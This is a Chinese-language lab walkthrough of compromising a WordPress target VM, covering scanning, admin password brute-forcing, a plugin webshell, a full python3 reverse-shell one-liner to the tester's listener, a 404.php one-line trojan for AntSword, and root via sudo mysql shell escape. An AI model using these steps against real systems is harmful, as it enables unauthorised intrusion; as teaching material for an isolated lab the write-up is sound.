## 一、信息收集

### 1.主机发现

```
sudo nmap -sn 10.0.2.0/24
```

![image-20211117091346386](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117091346386.png)

### 2.端口扫描

```
sudo nmap -p- 10.0.2.11
```

![image-20211117091944645](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117091944645.png)

### 3.端口服务信息扫描

```
sudo nmap -sV -p80 10.0.2.11
```

![image-20211117092313209](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117092313209.png)

### 4.访问10.0.2.11的80端口页面

访问：10.0.2.11:80

![image-20211117092452624](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117092452624.png)

是Apache在Ubuntu下的默认页面，没有能够利用的信息

### 5.使用feroxbuster目录扫描

（字典：sudo apt install seclist   较大）

```
feroxbuster --url http://10.0.2.11 -w /usr/share/dirb/wordlists/common.txt
```

扫描部分结果如下：

![image-20211117093525296](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117093525296.png)

### 6.访问可疑目录

访问http://10.0.2.11/wordpress/

载入页面的过程长达5分钟，只能显示页面的部分信息，且一直处于加载中状态

![image-20211117100907047](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117100907047.png)

思考：一个WordPress的站点，究竟在访问过程中加载了什么？使得加载过程如此缓慢？

### 7.使用Burpsuite对访问页面的流量进行分析

配置代理--OFF--访问http://10.0.2.11/wordpress/ --HTTP history

发现在访问http://10.0.2.11/wordpress/的过程中，页面在资源请求时还会访问地址192.168.159.145

![image-20211117103351121](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117103351121.png)

对页面返回的响应结果进行筛选过滤192.168.159.145

![image-20211117104819274](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117104819274.png)

发现存在默认访问该IP的硬编码写入

使用Burpsuite--Proxy--Match and Replace--Add--配置

作用：将响应头部中和响应体内的192.168.159.145强制替换为10.0.2.11

![image-20211117113559581](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117113559581.png)

![image-20211117113614462](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117113614462.png)

重新访问页面

![image-20211117105003629](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117105003629.png)

发现访问顺畅迅速，且加载了之前没能加载到的前端JS脚本，即页面加载成功。

![image-20211117110643947](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117110643947.png)

## 二、漏洞挖掘

### 1.对页面里的链接和表单提交等位置尝试检测

![image-20211117105845151](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117105845151.png)

![image-20211117110717572](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117110717572.png)

并未发现直接漏洞

### 2.对WordPress版本的漏洞进行查找

并未发现直接可利用漏洞（代码执行等）

### 3.返回查看目录扫描结果

![image-20211117105722251](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117105722251.png)

发现疑似管理后台路径，尝试访问http://10.0.2.11/wordpress/wp-admin

![image-20211117113657009](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117113657009.png)

确实是WordPress的管理后台，查询获得WordPress默认账号为admin，尝试弱口令后无果

![image-20211117113731381](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117113731381.png)

### 4.对管理页面进行密码爆破

根据长度筛选出 请求密码为adam14时发生了重定向

![image-20211117141137210](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141137210.png)

分析响应头中，重定向到http://192.168.159.145/wordpress/wp-admin/

且有服务端分配给访问者的cookie

![image-20211117141215930](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141215930.png)

登录WordPress后台，WordPress版本为5.7.1

![image-20211117141334010](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141334010.png)

### 5.WordPress后台漏洞利用

#### 5.1尝试在“主题”插入一句话木马连接蚁剑

Appearance--Theme Editor--404.php

![image-20211117141839492](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141839492.png)

上传失败

![image-20211117141931382](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141931382.png)



#### 5.2利用插件上传webshell

##### 5.2.1上传实现反弹shell连接

本地写一个简单的插件（符合WordPress标准的）

![image-20211117142333540](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142333540.png)

Plugins--Add--Upload Plugins

![image-20211117142059793](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142059793.png)

并压缩为可上传格式

![image-20211117142554942](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142554942.png)

上传、激活

![image-20211117142630478](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142630478.png)

![image-20211117142653949](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142653949.png)



插件默认路径为：

http://10.0.2.11/wordpress/wp-content/plugins/shell.php

![image-20211117142901551](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142901551.png)

尝试执行id命令：

http://10.0.2.11/wordpress/wp-content/plugins/shell.php?cmd=id

![image-20211117143020914](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117143020914.png)

确定了webshell上传成功，且可执行操作系统命令

##### 5.2.2 确认目标靶机上可利用的信息/软件

###### Kali监听4444端口

```
nc -nvlp 4444
```

![image-20211117143051516](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117143051516.png)

###### 确定目标靶机是否有nc

（存在，但本次尝试其他方法）

![image-20211117143209631](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117143209631.png)

###### 确定目标靶机是否有Python环境

![image-20211117144310167](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144310167.png)

![image-20211117144328196](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144328196.png)

![image-20211117144402379](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144402379.png)

目标靶机存在Python3环境

##### 5.2.3使用python3反弹shell代码

```
?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![image-20211117145344122](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145344122.png)

![image-20211117145402436](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145402436.png)

使用msf 寻找可利用的wordpress exp

```
sudo msfdb run
```

```
search wordpress admin
```

![image-20211117144658121](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144658121.png)

![image-20211117145600950](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145600950.png)



```
use 2
```

```
show options
```

```
set PASSWORD adam14
```

```
set RHOSTS 10.0.2.11
```

```
set TARGETURI /wordpress
```

```
set USERNAME admin
```

![image-20211117145845194](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145845194.png)

```
run
```

![image-20211117150025521](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150025521.png)

缺点：有些命令不能成功显示

#### 5.3再次尝试在“主题”插入一句话木马

回顾之前在Web页面插入一句话木马修改404.php模板失败，那在现已经获得命令行shell的前提下，是否可以尝试手动的添加一句话？

```
cd wp-content
```

```
cd themes
```

```
ls
```

![image-20211117150443652](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150443652.png)

再结合页面信息，确定当前主题名为twentytwentyone（404.php在其目录下）

![image-20211117150649101](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150649101.png)

```
cd twentytwentyone
```

```
ls
```

![image-20211117150806467](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150806467.png)

```
vi 404.php
```

![image-20211117150904611](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150904611.png)

试图移动光标发现webshell在交互过程中仍存在不足

升级webshell（只适用于bash）(此处是第二次复现整理的WP所以未再次退回环境重新截图，请参考代码文字即可)

```
Ctrl+Z
```

```
stty raw -echo
```

```
fg #返回之前的连接
```

```
ls
```

因为kali是zsh，故要切换为bash

```
ls /bin/bash  #确定是否有bash
```

```
sudo chsh -s /bin/bash #更改root用户
chsh -s /bin/bash #更改kali用户
（根据需要选择）
```

重启后进行确认并监听



准备重新连接shell



连接成功



升级webshell

```
Ctrl+Z
```

```
stty raw -echo
```

```
fg #返回之前的连接
```

```
ls
```

```
export SHELL=/bin/bash
```

```
export TERM=screen
```

```
stty rows 38 columns 116
```

```
reset
```

（升级成功 可Tab补全）调小字体后

在404.php中写入一句话

```
vi wp-content/themes/twentytwentyone/404.php
```

![image-20211117152444377](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117152444377.png)

保存后打开蚁剑进行配置以维持权限稳定

```
Shell:http://10.0.2.11/wordpress/wp-content/themes/twentytwentyone/404.php

pwd:aa
```

![image-20211117152943835](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117152943835.png)

成功连接

![image-20211117153006539](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117153006539.png)

## 三、提权

### 1.查看/etc/passwd

```
cat /etc/passwd
```

![image-20211117153735618](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117153735618.png)

### 2.查看主目录文件内是否有该用户

```
ls /home/wpadmin/ -l
```

![image-20211117153914865](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117153914865.png)

发现存在local.txt文件，只有wpadmin用户对其有读的权限

### 3.查看操作系统内核

```
uname -a
```

失败

### 4.尝试查看当前用户有没有sudo权限

```
sudo -l
```

失败

### 5.查看WordPress的配置文件

```
cd /var/www/html/wordpress/
```

```
cat wp-config.php
```

![image-20211117154514825](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154514825.png)

### 6.是否有密码复用的可能性?

```
ww-data@wp:/var/www/html/wordpress$ su wpadmin
Password: 
su: Authentication failure
```

![image-20211117154640760](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154640760.png)

失败

### 7.尝试登录数据库账号

```
mysql -u admin -p Wp_Admin#123 -D wordpress
```

![image-20211117154804076](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154804076.png)失败

### 8.尝试是否复用了Web页面的密码

```
su wpadmin
```

尝试输入密码adam14

![image-20211117154929085](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154929085.png)

```
cat local.txt
```

![image-20211117155043263](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155043263.png)

flag1:153495edec1b606c24947b1335998bd9

### 9.二次提权

```
sudo -l
```

提示可以执行的命令：

![image-20211117155135536](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155135536.png)

```
sudo /usr/bin/mysql -u root -D wordpress -p    #输入密码adam14
```

![image-20211117155339940](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155339940.png)

成功登录数据库

### 10.利用mysql数据库特性

当前启动的数据库进程是具有root权限的，结合mysql数据库 system 命令 的功能

```
system id 
```

![image-20211117155440756](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155440756.png)

```
\! /bin/bash
```

![image-20211117155507429](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155507429.png)

成功获取root权限

```
cd /root
```

```
ls
```

```
cat proof.txt
```

![image-20211117155542610](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155542610.png)

flag2:7efd721c8bfff2937c66235f2d0dbac1

